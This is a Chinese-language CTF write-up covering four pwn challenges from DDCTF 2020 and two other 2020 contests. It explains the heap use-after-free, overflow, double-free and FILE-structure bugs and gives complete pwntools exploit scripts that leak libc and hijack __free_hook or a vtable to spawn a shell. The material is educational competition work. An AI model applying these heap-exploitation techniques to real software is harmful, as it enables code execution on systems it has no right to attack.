---
layout: _drafts
title: ddctf2020
date: 2020-09-06 21:18:29
tags: DDCTF
---
# DDCTF2020 && 柏鹭杯2020 && 北京市网络安全宣传周技能赛 PWN wp

## 前言

这几个比赛连着打的，PWN题也比较少，写到一个里了，后两场比赛队友带飞拿了第一。

## DDCTF

### we love free

#### 漏洞利用

程序模拟了vector的逻辑，这种分配是按照0x20 0x30 0x50 ... n*0x20-0x10的顺序分配的。在vector的存储位置里有几个指针变量，其中start是分配的一个大堆块的起始位置，在存储的空间够用时都会使用这样一个大堆块。后面有个curretnt_ptr，指向输入，如果调用Add，则cureent每次加8，直到等于end指针，再开辟新的堆空间。

在edit的时候先malloc一个新堆块，free旧堆块，再edit旧堆块，编辑的长度是新堆块的大小，因此会造成UAF和溢出。

这里作者默认认为旧堆块和新堆块是连续的，因而即使溢出也不过只能溢出到下一个堆块一半以内的部分，这一点也很好理解，因为正常来说释放后如果ub和top_chunk相连，malloc_consolidate会使得整个堆块合并回去，之后的Add情形和之前相同，即使没有ub，因为fastbin的关系，也会按之前堆排布的方式进行分配，然而如果利用堆溢出改掉下一个ub(0x110)的sz，比如说0x51，再次释放就不会触发malloc_consolidate，且因为0x50进了fastbin，第二次的Add就会优先分配到这个块，那么0x30在原始位置，0x50到了一个靠后的位置，中间构造出unsorted bin，在edit的时候就可以编辑此ub的sz和bk，进而FSOP了。

注意最后编辑sz/bk的时候长度有限，因此在之前的输入里布置一下fake_vtable和system_addr，释放后仍有残留数据，构造出满足的条件，最后Add触发FSOP。

#### exp.py

```py
#coding:utf-8

#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='debug')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn1')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn1')
else:
    libc = ELF('./libc-2.23.so')
    p = remote('f.buuoj.cn',20173)

def Add(num=0x21):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("Input your num:")
    p.sendline(str(num))

def Show(is_edit='n'):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil("Edit (y/n):")
    p.sendline(is_edit)

def EditOnce(payload,is_edit='y'):
    p.recvuntil("Edit (y/n):")
    p.sendline(is_edit)
    if is_edit == 'y':
        p.sendline(payload)

def Delete():
    p.recvuntil('>>')
    p.sendline('3')


for i in range(2):
    Add()
#leak heap with initial heap
p.sendline('2')
p.recvuntil('1:')
heapbase = int(p.recvuntil('\n',drop=True),10)-(0x617c10-0x606000)
log.success('heapbase => '+hex(heapbase))
for i in range(6):
    EditOnce('a','n')
#leak libc
for i in range(10):
    Add()
Delete()
Add()
Show()
p.recvuntil("2:")
libc_base = int(p.recvline().strip('\n')) - libc.sym['__malloc_hook'] - 0x10 - 88
log.success("libc base => " + hex(libc_base))
libc.address = libc_base
for i in range(4):
    EditOnce('a','n')

#make heap layout
fake_vtable = heapbase+(0x617dc0-0x606000)
for i in range(14):
    Add()

p.recvuntil('>>')
p.sendline('2')
for i in range(16):
    EditOnce(str(fake_vtable),'n')
EditOnce(str(0x90),'y')
EditOnce(str(0x50),'y')
for i in range(7):
    EditOnce(str(0x21),'y')
EditOnce(str(fake_vtable),'y')
EditOnce(str(0x21),'y')
EditOnce(str(0x31),'y')
EditOnce(str(0),'y')
EditOnce(str(0),'y')
EditOnce(str(libc.sym['system']),'y')
EditOnce(str(libc.sym['system']),'y')
for i in range(2):
    EditOnce(str(0x91),'y')


Delete()

for i in range(4):
    Add()

p.recvuntil('>>')
p.sendline('2')
for i in range(14):
    EditOnce(str(0x1234),'n')
EditOnce(str(0x0068732f6e69622f))
EditOnce(str(0x61))
EditOnce(str(0))
EditOnce(str(libc.sym['_IO_list_all']-0x10))
EditOnce(str(2))
EditOnce(str(3))
for i in range(0xa8/8-3):
    EditOnce(str(0))

for i in range(2):
    Add(str(0))
Add(str(fake_vtable))

gdb.attach(p,'b malloc')
Add(str(0x50))


p.interactive()
```

## 柏鹭杯2020

### note

#### 程序逻辑

程序开始先用随机数做了种子，因而之后的随机数无法预测。可以add两种类型的堆块，在free里释放了`*node_addr`存储的chunk2，并用循环移位赋值的方式将原堆块的值覆写成后一个堆块的值。

```c
void **new1()
{
  void **result; // rax
  void *chunk_addr; // ST08_8
  unsigned int idx; // eax
  __int64 v3; // rcx

  result = (void **)(unsigned int)type1_total_count;
  if ( (unsigned int)type1_total_count <= 0x1F )
  {
    printf("index: %u\n", (unsigned int)type1_total_count);
    chunk_addr = malloc(0x20uLL);
    printf("message: ");
    get_input(0, chunk_addr, 0x20uLL);
    idx = type1_total_count++;
    v3 = idx;
    result = type1_list;
    type1_list[v3] = chunk_addr;
  }
  return result;
}
//
int edit1()
{
  void *v0; // rax
  int v2; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  LODWORD(v0) = read_choice();
  v2 = (signed int)v0;
  if ( (unsigned int)v0 <= 0x1F )
  {
    v0 = type1_list[(unsigned int)v0];
    if ( v0 )
    {
      printf("message: ");
      get_input(0, type1_list[v2], 0x20uLL);
      LODWORD(v0) = printf("new message: %s", type1_list[v2]);
    }
  }
  return (signed int)v0;
}
//void ***new2()
{
  void ***result; // rax
  void **node_addr; // ST00_8
  void *chunk_addr; // rax
  void *chunk_addr1; // ST08_8
  unsigned int v4; // eax
  __int64 idx; // rcx

  result = (void ***)(unsigned int)type2_total_count;
  if ( (unsigned int)type2_total_count <= 0x1F )
  {
    printf("index: %u\n", (unsigned int)type2_total_count);
    node_addr = (void **)malloc(0x20uLL);
    chunk_addr = malloc(0x20uLL);
    chunk_addr1 = chunk_addr;
    *node_addr = chunk_addr;
    printf("message1: ");
    get_input(0, chunk_addr1, 0x20uLL);
    printf("message2: ", chunk_addr1);
    get_input(0, node_addr + 1, 0x18uLL);
    v4 = type2_total_count++;
    idx = v4;
    result = type2_list;
    type2_list[idx] = node_addr;
  }
  return result;
}
//
int edit2()
{
  void **v0; // rax
  int v2; // [rsp+Ch] [rbp-4h]

  printf("index: ");
  LODWORD(v0) = read_choice();
  v2 = (signed int)v0;
  if ( (unsigned int)v0 <= 0x1F )
  {
    v0 = type2_list[(unsigned int)v0];
    if ( v0 )
    {
      printf("message1: ");
      get_input(0, *type2_list[v2], 0x20uLL);
      printf("message2: ");
      LODWORD(v0) = get_input(0, type2_list[v2] + 1, 0x18uLL);
    }
  }
  return (signed int)v0;
}
//
__int64 Free()
{
  unsigned int idx1; // ST08_4
  unsigned int idx2; // ST0C_4
  void *chunk_addr; // ST10_8
  void **node_addr; // ST18_8
  unsigned int i; // [rsp+4h] [rbp-1Ch]

  idx1 = rand() % (unsigned int)type1_total_count;
  idx2 = rand() % (unsigned int)type2_total_count;
  printf("note1: %u\n", idx1);
  printf("note2: %u\n", idx2);
  chunk_addr = type1_list[idx1];
  node_addr = type2_list[idx2];
  free(*node_addr);
  *node_addr = chunk_addr;
  for ( i = idx1; i < type1_total_count; ++i )
    type1_list[i] = type1_list[i + 1];
  return (unsigned int)(type1_total_count-- - 1);
}
```

#### 漏洞利用

因为type1_list和type2_list紧挨着，当分配0x20个块时调用Delete，函数的移位赋值使得type1_list上出现了`type2_list[0]`。我们通过edit1函数部分修改type2_chunk，从而leak出Heap，再利用type1+type2的任意地址写将type2_chunk的sz改大，释放后放入unsorted bin(注意此前修改tcache_perthread_struct的对应的count大于7)，再和之前一样部分写低字节leak出libc地址。最后用这个任意地址写将__free_hook改为system，再释放一个包含`/bin/sh`的块即可。

#### exp.py 

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./note')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./note')
else:
    libc = ELF('./libc.so')
    p = remote('124.70.131.128',12031)

def Add1(msg='a'):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil("message: ")
    p.send(msg)

def Add2(msg1='a',msg2='b'):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil("message1: ")
    p.send(msg1)
    p.recvuntil("message2: ")
    p.send(msg2)

def Edit1(index,msg):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("message: ")
    p.send(msg)

def Edit2(index,msg1,msg2):
    p.recvuntil('>>')
    p.sendline('4')
    p.recvuntil("index: ")
    p.sendline(str(index))
    p.recvuntil("message1: ")
    p.send(msg1)
    p.recvuntil("message2: ")
    p.send(msg2)

def Delete():
    p.recvuntil('>>')
    p.sendline('5')


def exp():
    #leak libc
    Add2()
    for i in range(0x20):
        Add1(p64(0x431)*4)
    for i in range(0x20):
        Delete()
    #Add1()
    #0x7310
    Edit1(0,'\x10')
    #Delete()
    p.recvuntil("new message: ")
    heap_base = u64(p.recvuntil("1.new",drop=True).ljust(8,'\x00')) & 0xfffffffffffff000
    log.success("heap base => " + hex(heap_base))
    #UAF to tcache perthread
    Add1()
    Edit1(1,p64(heap_base+0x258))
    Edit2(0,p64(0x451),'a')
    Edit1(1,p64(heap_base+0x260))
    Delete()
    Edit1(1,'a'*8)
    p.recvuntil("new message: aaaaaaaa")
    libc_base = u64(p.recvuntil("1.new",drop=True).ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 96
    log.success("libc base => " + hex(libc_base))
    #get shell
    Add1()
    Edit1(1,p64(heap_base+0x258))
    Edit2(0,p64(0x31),'a')
    Edit1(1,p64(heap_base+0x260))

    Delete()

    Edit1(1,p64(libc_base+libc.sym['__free_hook']-8))
    Add1()
    Add1("/bin/sh\x00"+p64(libc_base+libc.sym['system']))
    Edit1(3,p64(libc_base+libc.sym['__free_hook']-8))
    Delete()
    p.interactive()

exp()
```

### MineSweeper

#### 漏洞利用

在Game里有四个选项，A继续，B删除，C插旗子，D挖雷。其中B存在double free。首先通过B的UAF分配到存储name的sz部分，改成0xa1之后释放(注意因为这里被置为了非0所以直接win了，在此之前要绕过一个0x202010处的check)，之后分配大堆块触发malloc_consolidate，使得name以及下面的堆块进行合并，从而可以写包含有存储地雷的堆块的堆块，从而可以覆写其地址，leak出任意堆块的内容，这里首先leak出heap倒数第二字节的内容，从而可以改写其到unsorted bin的地址leak出libc，最后由于可以改写name_addr又可以改写name，所以地址任意写改__free_hook到system，释放包含/bin/sh的块即可get shell。

#### exp.py 

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./MineSweeper')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./MineSweeper')

else:
    libc = ELF('./libc.so')
    p = remote("124.70.131.128",12032)

def Game():
    p.recvuntil('$ ')
    p.sendline('1')
    for i in range(3):
        p.recvuntil("----------------------\n")

def Report(sz,content='a'):
    p.recvuntil('$ ')
    p.sendline('2')
    p.recvuntil("BugReport: ")
    p.sendline(str(sz))
    sleep(0.02)
    p.sendline(content)


def exp():
    #leak libc
    Game()
    p.sendline('B')
    Report(0x38,'a'*0x28+'\xe8')#win flag != 0
    Game()

    p.sendline("C0")#in case 0x202010
    p.sendline("D001")
    p.recvuntil("New Record! Your name: ")
    p.sendline(p64(0xa1))
    p.sendline("A")#again
    #malloc consolidate
    Report(0x500)
    #leak heap
    Report(0xe0,'a'*0xa0+'\x51')
    p.recvuntil('$ ')
    p.sendline('1')
    p.recvn(0x43)
    heap_low = u8(p.recvn(1)) & 0xf0
    target = (heap_low << 8) + 0xa0
    print hex(target)
    p.sendline("A")
    #p.recvuntil("")
    #leak libc
    libc_addr = ""

    for i in range(6):
        Report(0xe0,'a'*0xa0+p16(target+i))
        p.recvuntil('$ ')
        p.sendline('1')
        p.recvn(0x43)
        libc_addr += p.recvn(1)
        p.sendline("A")

    libc_base = u64(libc_addr.ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 88 - 0x10
    log.success("libc base => " + hex(libc_base))
    libc.address = libc_base
    #get shell

    Report(0x38,'a'*0x28+p64(libc.sym['__free_hook']))
    Game()
    p.sendline("C0")
    sleep(0.02)
    p.sendline("D110")

    p.recvuntil("New Record! Your name: ")
    p.sendline(p64(libc.sym['system']))
    p.sendline("A")#again
    #gdb.attach(p,'b* 0x0000555555554000+0xbd5')
    Report(0x30,"/bin/sh\x00")
    p.interactive()

exp()
```

## 北京市网络安全宣传周技能赛

### vmpwn

#### 程序逻辑

模拟了一个小vm，通过指针递减+write泄露出libc。通过指针增加到stderr伪造`_IO_2_1_stderr_`，修改其vtable里+0x10处的指针，fclose时触发调用。这里有两个地方需要注意，一是参数位于`_flags`，但是后面会对其前4字节进行异或处理，这里用`;sh\x00`做注入；二是抄完stderr的值后发现有错误，跟着源码调一下到某个位置发现指定的值需要是0x20，因而下面有个值是`0x0000002000000002`，后四字节对应fd，前四字节为绕过此检查。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+Ch] [rbp-54h]

  puts("It's an easy vm pwn.");
  sub_400796();
  for ( i = 0; i <= 1; ++i )
  {
    puts("input the code:");
    get_input((__int64)&bss_code, 0x400);
    Run();
  }
  fclose(stderr);
  return 0LL;
}
//
void__int64 Run(){
  __int64 result; // rax
  _BYTE *i; // [rsp+0h] [rbp-90h]

  for ( i = &bss_code; ; ++i )
  {
    result = (unsigned __int8)*i;
    if ( !(_BYTE)result )
      break;
    switch ( *i )
    {
      case 0x11:
        buf = (char *)buf + 1;
        break;
      case 0x12:
        buf = (char *)buf - 1;
        break;
      case 0x13:
        buf = (void *)(2LL * (_QWORD)buf);
        break;
      case 0x14:
        buf = (void *)((signed __int64)buf / 2);
        break;
      case 0x15:
        write(1, buf, 1uLL);
        break;
      case 0x16:
        read(0, buf, 1uLL);
        break;
      case 0x17:
        *(_BYTE *)buf = 0;
        break;
      case 0x18:
        *(_BYTE *)buf = 1;
        break;
      case 0x19:
        *(_BYTE *)buf = 2;
        break;
      case 0x1A:
        *(_BYTE *)buf = 3;
        break;
      case 0x1B:
        *(_BYTE *)buf = 4;
        break;
      case 0x1C:
        *(_BYTE *)buf = 5;
        break;
      case 0x1D:
        *(_BYTE *)buf = 6;
        break;
      case 0x1E:
        *(_BYTE *)buf = 7;
        break;
      case 0x1F:
        *(_BYTE *)buf = 8;
        break;
      case 0x20:
        *(_BYTE *)buf = 9;
        break;
      case 0x21:
        *(_BYTE *)buf = 0xA;
        break;
      case 0x22:
        *(_BYTE *)buf = 0xB;
        break;
      case 0x23:
        *(_BYTE *)buf = 0xC;
        break;
      case 0x24:
        *(_BYTE *)buf = 0xD;
        break;
      case 0x25:
        *(_BYTE *)buf = 0xE;
        break;
      case 0x26:
        *(_BYTE *)buf = 0xF;
        break;
    }
  }
  return result;
}
```

#### exp.py 

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')
else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def exp():
    #leak libc
    p.recvuntil("input the code:\n")
    puts_got = elf.got['puts']
    buf_addr = 0x6020c0
    payload = '\x12'*(buf_addr-puts_got)
    payload += '\x15\x11'*8
    p.sendline(payload)
    libc_base = u64(p.recvn(8)) - libc.sym['puts']
    log.success("libc base => " + hex(libc_base))
    staic_libc = 0x7ffff7a0d000
    gdb.attach(p,'b* 0x400c7a')
    #get shell
    fake_io = flat([
        libc_base+(0x00007ffff7dd25c3-staic_libc),
        libc_base+(0x00007ffff7dd25c3-staic_libc),libc_base+(0x00007ffff7dd25c3-staic_libc),
        libc_base+(0x00007ffff7dd25c3-staic_libc),libc_base+(0x00007ffff7dd25c3-staic_libc),
        libc_base+(0x00007ffff7dd25c3-staic_libc),libc_base+(0x00007ffff7dd25c3-staic_libc),
        libc_base+(0x00007ffff7dd25c4-staic_libc),0,
        0,0,
        0,libc_base+(0x00007ffff7dd2620-staic_libc),
        0x0000002000000002,0xffffffffffffffff,
        0,libc_base+(0x00007ffff7dd3770-staic_libc),
        0xffffffffffffffff,0,
        libc_base+(0x00007ffff7dd1660-staic_libc),0,
        0,libc_base+libc.sym['system'],
        0,0,
        0,0x6020f0
        ])
    stderr = 0x602040
    payload = (stderr-puts_got-8)*'\x11'
    payload += '\x16\x11'*(len(fake_io)+0x10)
    p.recvuntil("input the code:\n")
    p.sendline(payload)
    raw_input()
    p.send(p64(stderr+8)+"/bin;sh\x00"+fake_io)
    p.interactive()

exp()

```
